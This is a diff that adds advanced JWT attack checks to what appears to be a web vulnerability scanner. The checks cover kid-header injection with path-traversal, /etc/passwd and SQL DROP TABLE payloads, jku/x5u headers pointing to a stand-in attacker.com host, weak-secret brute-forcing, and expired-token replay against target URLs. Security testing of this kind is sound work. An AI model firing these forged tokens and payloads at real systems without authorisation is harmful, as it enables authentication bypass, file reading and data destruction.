@@ -29,6 +29,11 @@ class JWTModule:
         # Check if parameter contains JWT
         if re.match(self.jwt_pattern, value):
             self._analyze_jwt(url, param, value)
+            # Phase J2: Run advanced JWT attacks
+            self._test_kid_injection_advanced(url, method, param, value)
+            self._test_jwks_injection(url, method, param, value)
+            self._test_weak_secret(url, method, param, value)
+            self._test_expired_replay(url, method, param, value)
     
     def test_url(self, url: str):
         """Test URL for JWT"""
@@ -245,3 +250,145 @@ class JWTModule:
         except Exception as e:
             print(f"{Colors.error(f'JWT alg confusion error: {e}')}")
             return None
+
+    # ------------------------------------------------------------------
+    # Phase J2: JWT Advanced Attacks
+    # ------------------------------------------------------------------
+
+    def _test_kid_injection_advanced(self, url, method, param, token):
+        """J2: Key ID (kid) injection — path traversal / SQLi via kid header."""
+        kid_payloads = [
+            "../../dev/null",
+            "/dev/null",
+            "../../../../../../dev/null",
+            "'; DROP TABLE users; --",
+            "' UNION SELECT 'secret' --",
+            "../../../../../../etc/passwd",
+            "/proc/self/environ",
+        ]
+        for kid_val in kid_payloads:
+            try:
+                parts = token.split('.')
+                header_json = json.loads(
+                    base64.urlsafe_b64decode(parts[0] + '=='))
+                header_json['kid'] = kid_val
+                header_b64 = base64.urlsafe_b64encode(
+                    json.dumps(header_json).encode()).decode().rstrip('=')
+                # For /dev/null the signing key would be empty
+                import hmac, hashlib
+                key = b'' if 'null' in kid_val else kid_val.encode()
+                message = f"{header_b64}.{parts[1]}"
+                sig = hmac.new(key, message.encode(), hashlib.sha256).digest()
+                sig_b64 = base64.urlsafe_b64encode(sig).decode().rstrip('=')
+                forged = f"{header_b64}.{parts[1]}.{sig_b64}"
+
+                data = {param: forged} if param else {}
+                headers = {}
+                if not param:
+                    headers['Authorization'] = f'Bearer {forged}'
+                resp = self.requester.request(url, method, data=data,
+                                              headers=headers)
+                if resp and resp.status_code in (200, 201, 204):
+                    from core.engine import Finding
+                    self.engine.add_finding(Finding(
+                        technique='JWT kid Injection',
+                        url=url, method=method, param=param or 'Authorization',
+                        payload=f'kid={kid_val}',
+                        evidence=resp.text[:200] if resp.text else '',
+                        severity='CRITICAL', confidence=0.7,
+                    ))
+                    return
+            except Exception:
+                continue
+
+    def _test_jwks_injection(self, url, method, param, token):
+        """J2: JWKS injection — set jku / x5u to attacker-controlled URL."""
+        try:
+            parts = token.split('.')
+            header_json = json.loads(
+                base64.urlsafe_b64decode(parts[0] + '=='))
+            for hdr_key, val in [
+                ('jku', 'http://attacker.com/.well-known/jwks.json'),
+                ('x5u', 'http://attacker.com/cert.pem'),
+            ]:
+                modified = dict(header_json)
+                modified[hdr_key] = val
+                header_b64 = base64.urlsafe_b64encode(
+                    json.dumps(modified).encode()).decode().rstrip('=')
+                forged = f"{header_b64}.{parts[1]}.{parts[2]}"
+
+                data = {param: forged} if param else {}
+                headers = {}
+                if not param:
+                    headers['Authorization'] = f'Bearer {forged}'
+                resp = self.requester.request(url, method, data=data,
+                                              headers=headers)
+                if resp and resp.status_code in (200, 201, 204):
+                    from core.engine import Finding
+                    self.engine.add_finding(Finding(
+                        technique=f'JWT {hdr_key} Injection',
+                        url=url, method=method, param=param or 'Authorization',
+                        payload=f'{hdr_key}={val}',
+                        evidence=resp.text[:200] if resp.text else '',
+                        severity='HIGH', confidence=0.6,
+                    ))
+        except Exception:
+            pass
+
+    def _test_weak_secret(self, url, method, param, token):
+        """J2: Brute-force HS256 weak secret offline."""
+        common_secrets = [
+            'secret', 'password', '123456', 'key', 'test', 'admin',
+            'changeme', 'jwt_secret', 'token', 'supersecret',
+            'HS256-secret', 'default', 'pass', 'qwerty', '',
+            'letmein', 'welcome', 'P@ssw0rd', 'jwt', 'secret123',
+        ]
+        import hmac, hashlib
+        try:
+            parts = token.split('.')
+            message = f"{parts[0]}.{parts[1]}".encode()
+            original_sig = base64.urlsafe_b64decode(parts[2] + '==')
+            for secret in common_secrets:
+                sig = hmac.new(secret.encode(), message, hashlib.sha256).digest()
+                if sig == original_sig:
+                    from core.engine import Finding
+                    self.engine.add_finding(Finding(
+                        technique='JWT Weak Secret',
+                        url=url, method=method, param=param or 'Authorization',
+                        payload=f'secret="{secret}"',
+                        evidence=f'JWT signed with weak secret: {secret!r}',
+                        severity='CRITICAL', confidence=0.95,
+                    ))
+                    return
+        except Exception:
+            pass
+
+    def _test_expired_replay(self, url, method, param, token):
+        """J2: Test if expired tokens are still accepted."""
+        try:
+            parts = token.split('.')
+            payload_json = json.loads(
+                base64.urlsafe_b64decode(parts[1] + '=='))
+            exp = payload_json.get('exp')
+            if exp is None:
+                return
+            import time as _time
+            if exp < _time.time():
+                # Token is already expired — send it as-is
+                data = {param: token} if param else {}
+                headers = {}
+                if not param:
+                    headers['Authorization'] = f'Bearer {token}'
+                resp = self.requester.request(url, method, data=data,
+                                              headers=headers)
+                if resp and resp.status_code in (200, 201, 204):
+                    from core.engine import Finding
+                    self.engine.add_finding(Finding(
+                        technique='JWT Expired Token Accepted',
+                        url=url, method=method, param=param or 'Authorization',
+                        payload='expired JWT',
+                        evidence=f'Expired (exp={exp}) but status={resp.status_code}',
+                        severity='HIGH', confidence=0.8,
+                    ))
+        except Exception:
+            pass
